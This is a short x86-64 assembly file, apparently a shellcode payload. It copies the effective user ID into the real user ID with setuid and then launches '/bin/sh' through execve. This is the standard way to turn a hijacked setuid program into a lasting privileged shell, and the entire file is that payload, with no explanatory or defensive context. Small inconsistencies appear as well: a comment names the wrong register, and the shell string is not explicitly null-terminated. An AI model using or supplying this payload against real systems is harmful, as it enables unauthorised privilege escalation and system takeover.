
global _start

section .text
_start:

	; rdi = geteuid()
	mov rax, 107
	syscall

	; setuid(rdi)
	mov rdi, rax
	mov rax, 105
	syscall

	; execve('/bin/sh', NULL, NULL)
	mov rax, 59
	mov rdi, sh
	xor rsi, rsi
	xor rdx, rdx
	syscall

section .data:
	sh: db '/bin/sh'
